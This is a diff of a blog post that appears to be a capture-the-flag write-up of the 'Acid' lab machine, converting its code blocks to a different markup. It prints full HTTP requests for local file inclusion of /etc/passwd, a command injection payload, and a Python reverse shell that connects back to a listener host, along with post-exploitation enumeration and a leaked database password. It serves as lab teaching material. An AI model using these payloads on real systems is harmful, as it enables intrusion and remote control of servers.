 <p>Because the hashes are salted SHA512, it was not reasonable to crack them. Instead, using google we found the hashes from test_user <a href="http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL">here</a>:</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Username: test_user
-</span><span class='line'>Email: &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#116;&#101;&#115;&#116;&#64;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#101;&#46;&#99;&#x6f;&#109;">&#116;&#101;&#115;&#116;&#64;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#46;&#99;&#111;&#109;&lt;/a>
-</span><span class='line'>Password: 6ZaxN2Vzm9NUJT2y</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+Username: test_user
+Email: <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x74;&#x65;&#115;&#x74;&#64;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#x63;&#111;&#109;">&#116;&#x65;&#115;&#x74;&#x40;&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#99;&#x6f;&#x6d;</a>
+Password: 6ZaxN2Vzm9NUJT2y
+{% endcodeblock %}</p>
 
 <p>We log in and proceed to the text step:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/&lt;/a>
-</span><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+<a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/</a>
+<a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php</a>
+{% endcodeblock %}</p>
 
 <p>There was <code>&lt;!--0x5933566a4c6e4a34626e413d--&gt;</code> on the page, that means after hex/base64/rot13/reverse <code>cake.php</code>.</p>
 
 <p>We identified LFI:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET /Challenge/include.php?file=/etc/passwd&amp;add=Extract+File HTTP/1.1
-</span><span class='line'>Host: 192.168.80.158:33447
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: &lt;a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php&lt;/a>
-</span><span class='line'>Cookie: sec_session_id=f1c3r9m5ud1pdctd6efvgu7ti6
-</span><span class='line'>Connection: keep-alive&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>&hellip;
-</span><span class='line'>root:x:0:0:root:/root:/bin/bash
-</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-</span><span class='line'>bin:x:2:2:bin:/bin:/usr/sbin/nologin
-</span><span class='line'>sys:x:3:3:sys:/dev:/usr/sbin/nologin
-</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
-</span><span class='line'>games:x:5:60:games:/usr/games:/usr/sbin/nologin
-</span><span class='line'>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-</span><span class='line'>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/a>
-</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-</span><span class='line'>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-</span><span class='line'>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-</span><span class='line'>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-</span><span class='line'>systemd-timesync:x:100:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
-</span><span class='line'>systemd-network:x:101:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
-</span><span class='line'>systemd-resolve:x:102:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-</span><span class='line'>systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
-</span><span class='line'>syslog:x:104:110::/home/syslog:/bin/false
-</span><span class='line'>messagebus:x:105:112::/var/run/dbus:/bin/false
-</span><span class='line'>uuidd:x:106:113::/run/uuidd:/bin/false
-</span><span class='line'>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-</span><span class='line'>ntp:x:108:117::/home/ntp:/bin/false
-</span><span class='line'>whoopsie:x:109:118::/nonexistent:/bin/false
-</span><span class='line'>acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
-</span><span class='line'>mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
-</span><span class='line'>saman:x:1001:1001:,,,:/home/saman:/bin/bash</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+GET /Challenge/include.php?file=/etc/passwd&amp;add=Extract+File HTTP/1.1
+Host: 192.168.80.158:33447
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php</a>
+Cookie: sec_session_id=f1c3r9m5ud1pdctd6efvgu7ti6
+Connection: keep-alive</p>
+
+<p>&hellip;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+<a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</a>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:110::/home/syslog:/bin/false
+messagebus:x:105:112::/var/run/dbus:/bin/false
+uuidd:x:106:113::/run/uuidd:/bin/false
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+ntp:x:108:117::/home/ntp:/bin/false
+whoopsie:x:109:118::/nonexistent:/bin/false
+acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
+mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
+saman:x:1001:1001:,,,:/home/saman:/bin/bash
+{% endcodeblock %}</p>
 
 <p><a href="http://192.168.80.158:33447/Challenge/cake.php">http://192.168.80.158:33447/Challenge/cake.php</a> shows also the <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a> URL.</p>
 
@@ -432,371 +274,212 @@ method:</p>
 
 <p>We wanted to hack the server using <code>/proc/self/environ</code> technique, but the server was a recent ubuntu version and we found only reference to session variable <a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/self/fd/14&amp;add=Extract+File">file</a>.</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File&lt;/a>
-</span><span class='line'>&lt;a href="http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+<a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File</a>
+<a href="http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File</a>
+{% endcodeblock %}</p>
 
 <p>We gave up hacking via /proc, but dirb reveals another files:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# dirb &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/&lt;/a>  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -X .html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml -fw&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;p>DIRB v2.21&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;h2>By The Dark Raver&lt;/h2>
-</span><span class='line'>
-</span><span class='line'>&lt;p>START_TIME: Wed Apr 29 18:52:56 2015
-</span><span class='line'>URL_BASE: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/&lt;/a>
-</span><span class='line'>WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span><span class='line'>OPTION: Fine tunning of NOT_FOUND detection
-</span><span class='line'>OPTION: Not Stoping on warning messages
-</span><span class='line'>EXTENSIONS_LIST: (.html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml) | (.html)(.php)(.ini)(.txt)(.inc)(.zip)(.bak)(.rar)(.xml) [NUM = 9]&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;p>GENERATED WORDS: 219174
-</span><span class='line'>(!) WARNING: Wordlist is too large. This will take a long time to end.
-</span><span class='line'>    (Use mode &lsquo;-w&rsquo; if you want to scan anyway)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>&mdash;- Scanning URL: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/&lt;/a> &mdash;-
-</span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/low.php">http://192.168.80.158:33447/Challenge/Magic_Box/low.php&lt;/a> (CODE:200|SIZE:0)
-</span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a> (CODE:200|SIZE:54)
-</span><span class='line'>+ &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php&lt;/a> (CODE:200|SIZE:74)</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+root@kali32:~# dirb <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a>  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -X .html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml -fw</p>
+
+<hr />
+
+<p>DIRB v2.21</p>
+
+<h2>By The Dark Raver</h2>
+
+<p>START_TIME: Wed Apr 29 18:52:56 2015
+URL_BASE: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a>
+WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+OPTION: Fine tunning of NOT_FOUND detection
+OPTION: Not Stoping on warning messages
+EXTENSIONS_LIST: (.html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml) | (.html)(.php)(.ini)(.txt)(.inc)(.zip)(.bak)(.rar)(.xml) [NUM = 9]</p>
+
+<hr />
+
+<p>GENERATED WORDS: 219174
+(!) WARNING: Wordlist is too large. This will take a long time to end.
+    (Use mode &lsquo;-w&rsquo; if you want to scan anyway)</p>
+
+<p>&mdash;- Scanning URL: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a> &mdash;-
++ <a href="http://192.168.80.158:33447/Challenge/Magic_Box/low.php">http://192.168.80.158:33447/Challenge/Magic_Box/low.php</a> (CODE:200|SIZE:0)
++ <a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php</a> (CODE:200|SIZE:54)
++ <a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php</a> (CODE:200|SIZE:74)
+{% endcodeblock %}</p>
 
 <p>Now we understand from the index page the sentence <code>Fairy tails uses secret keys to open the magical doors.</code></p>
 
 <p>Seems that we almost won, because RCE (OS Commanding) on <a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.</a></p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /Challenge/Magic_Box/command.php HTTP/1.1
-</span><span class='line'>Host: 192.168.80.158:33447
-</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em>/&lt;/em>;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a>
-</span><span class='line'>Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Content-Length: 29&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>IP=127.0.0.1;id&amp;submit=submit&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>&hellip;&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
-</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms
-</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.016 ms&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>&mdash; 127.0.0.1 ping statistics &mdash;
-</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1998ms
-</span><span class='line'>rtt min/avg/max/mdev = 0.013/0.015/0.017/0.003 ms
-</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+POST /Challenge/Magic_Box/command.php HTTP/1.1
+Host: 192.168.80.158:33447
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php</a>
+Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29</p>
+
+<p>IP=127.0.0.1;id&amp;submit=submit</p>
+
+<p>&hellip;</p>
+
+<p>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.016 ms</p>
+
+<p>&mdash; 127.0.0.1 ping statistics &mdash;
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.013/0.015/0.017/0.003 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+{% endcodeblock %}</p>
 
 <p>We realized after a few seconds, that there is no nc with executable property,
 no curl, no wget and no writable place in DocumentRoot on obvious place, we tried
 to store something to <code>/var/www/html/</code>. We could send anything over netcat, but
 using python reverse shell could be more efficient:</p>
 
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nc -l -p 1337&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>POST /Challenge/Magic_Box/command.php HTTP/1.1
-</span><span class='line'>Host: 192.168.80.158:33447
-</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em>/&lt;/em>;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: &lt;a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php&lt;/a>
-</span><span class='line'>Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Content-Length: 101&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>IP=x ;python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;192.168.80.137&rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;&amp;submit=submit</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock %}
+root@kali32:~# nc -l -p 1337</p>
+
+<p>POST /Challenge/Magic_Box/command.php HTTP/1.1
+Host: 192.168.80.158:33447
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php</a>
+Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 101</p>
+
+<p>IP=x ;python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;192.168.80.137&rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;&amp;submit=submit
+{% endcodeblock %}</p>
 
 <p>We are connected and now we need to escalate our privileges. We found:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat psl-config.php
-</span><span class='line'>&lt;?php
-</span><span class='line'>define(&ldquo;HOST&rdquo;, &ldquo;localhost&rdquo;);                    // The host you want to connect to.
-</span><span class='line'>define(&ldquo;USER&rdquo;, &ldquo;root&rdquo;);                         // The database username.
-</span><span class='line'>define(&ldquo;PASSWORD&rdquo;, &ldquo;mehak&rdquo;);    // The database password.
-</span><span class='line'>define(&ldquo;DATABASE&rdquo;, &ldquo;secure_login&rdquo;);             // The database name.&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>www-data@acid:/$ find / -user acid 2>/dev/null
-</span><span class='line'>/sbin/raw_vs_isi/hint.pcapng
-</span><span class='line'>/bin/pwn_me
-</span><span class='line'>/bin/pwn_me/chkrootkit.lsm
-</span><span class='line'>/bin/pwn_me/chkrootkit
-</span><span class='line'>/bin/pwn_me/README.chkwtmp
-</span><span class='line'>/bin/pwn_me/ACKNOWLEDGMENTS
-</span><span class='line'>/bin/pwn_me/chkdirs.c
-</span><span class='line'>/bin/pwn_me/ifpromisc.c
-</span><span class='line'>/bin/pwn_me/Makefile
-</span><span class='line'>/bin/pwn_me/chklastlog.c
-</span><span class='line'>/bin/pwn_me/strings.c
-</span><span class='line'>/bin/pwn_me/chkwtmp.c
-</span><span class='line'>/bin/pwn_me/README.chklastlog
-</span><span class='line'>/bin/pwn_me/COPYRIGHT
-</span><span class='line'>/bin/pwn_me/chkproc.c
-</span><span class='line'>/bin/pwn_me/README
-</span><span class='line'>/bin/pwn_me/chkutmp.c
-</span><span class='line'>/bin/pwn_me/check_wtmpx.c
-</span><span class='line'>/var/lib/lightdm-data/acid
-</span><span class='line'>/var/www/html/Challenge/less
-</span><span class='line'>/var/www/html/Challenge/less/style.less
-</span><span class='line'>/var/www/html/Challenge/css
-</span><span class='line'>/var/www/html/Challenge/css/style.css
-</span><span class='line'>/var/www/html/Challenge/css/style.css.save
-</span><span class='line'>/var/www/html/index.html
-</span><span class='line'>/var/www/html/images
-</span><span class='line'>/var/www/html/images/bg.jpg
-</span><span class='line'>/var/www/html/images/Thumbs.db
-</span><span class='line'>/var/www/html/images/wow.jpg
-</span><span class='line'>/var/www/html/css
-</span><span class='line'>/var/www/html/css/style.css
-</span><span class='line'>/home/acid
-</span><span class='line'>/home/acid/.xsession-errors.old
-</span><span class='line'>/home/acid/Public
-</span><span class='line'>/home/acid/.thumbnails
-</span><span class='line'>/home/acid/Desktop
-</span><span class='line'>/home/acid/.mozilla
-</span><span class='line'>/home/acid/.gconf
-</span><span class='line'>/home/acid/Videos
-</span><span class='line'>/home/acid/Templates
-</span><span class='line'>/home/acid/.config
-</span><span class='line'>/home/acid/Music
-</span><span class='line'>/home/acid/.profile
-</span><span class='line'>/home/acid/.bashrc
-</span><span class='line'>/home/acid/.sudo_as_admin_successful
-</span><span class='line'>/home/acid/Downloads
-</span><span class='line'>/home/acid/.xsession-errors
-</span><span class='line'>/home/acid/.dmrc
-</span><span class='line'>/home/acid/.Xauthority
-</span><span class='line'>/home/acid/.local
-</span><span class='line'>/home/acid/.local/share
-</span><span class='line'>/home/acid/.xscreensaver
-</span><span class='line'>/home/acid/.bash_history
